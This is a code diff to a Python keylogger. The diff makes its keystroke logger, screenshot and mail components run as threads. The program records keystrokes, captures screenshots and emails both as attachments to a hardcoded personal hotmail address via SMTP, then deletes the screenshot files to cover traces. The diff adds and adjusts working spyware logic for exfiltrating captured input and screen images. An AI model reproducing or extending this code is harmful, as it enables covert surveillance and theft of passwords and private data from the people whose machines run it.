@@ -13,7 +13,7 @@ from email.mime.base import MIMEBase
 from email.mime.image import MIMEImage
 
 reciver_email_address="thivankanimesh@hotmail.com"
-mailling_time_gap=20
+mailling_time_gap=50
 screen_shots_time_gap=10
 mouse_click_events=False
 screen_shots=False
@@ -49,10 +49,13 @@ class Screenshot(threading.Thread):
         def run(self):
                 print("screenshot thread startted")
 
-class KeyLogger:
+class KeyLogger(threading.Thread):
 
         keys = []
         overall_count=0
+
+        def __init__(self):
+                threading.Thread.__init__(self)
 
         def write_file(self,key):
                 self.keys.append(key)
@@ -90,9 +93,6 @@ class Mail(threading.Thread):
                 msg['From']=sender_email_address
                 msg['To']=reciver_email_address
 
-                #DEBUGGING
-                #print(time.time()-last_mail_sent_time)
-
                 if((time.time()-last_mail_sent_time)>=mailling_time_gap):
 
                         #Making keylogs attachment
@@ -108,18 +108,26 @@ class Mail(threading.Thread):
                         for image in os.listdir('./img'):
                                 screen_shots_attachment=MIMEImage(open(str.format('./img/{0}',image),'rb').read())
                                 msg.attach(screen_shots_attachment)
+                        #errace screenshot directory(./img)
+                        for image in os.listdir('./img'):
+                                os.remove(str.format('./img/{0}',image))
 
+                        #sending mail
                         self.smtp.sendmail(sender_email_address,reciver_email_address,msg.as_string())
+
                         #Updating message sent time
                         last_mail_sent_time=time.time()
                         #DEBUGGIN
                         print("email is sent")
 
-class System:
+class System(threading.Thread):
 
         keylogger=KeyLogger()
         screenshot=Screenshot()
         mail=Mail()
+
+        def __init__(self):
+                threading.Thread.__init__(self)
 
         if __name__ == '__main__':
 
@@ -127,13 +135,15 @@ class System:
 
                 mail.start()
                 screenshot.start()
+                keylogger.start()
                 
                 mail.join()
                 screenshot.join()
+                keylogger.join()
 
                 print('if __name__ == ')
         
-        def run(self,key):
+        def runnn(self,key):
 
                 print("test")
                 print(key)
@@ -143,9 +153,11 @@ class System:
                 self.mail.sendMail()
             
 sys=System()
+sys.start()
+sys.join()
 
 def on_press(key):
-        sys.run(key)
+        sys.runnn(key)
     
 def on_release(key):
         if(key==Key.esc):
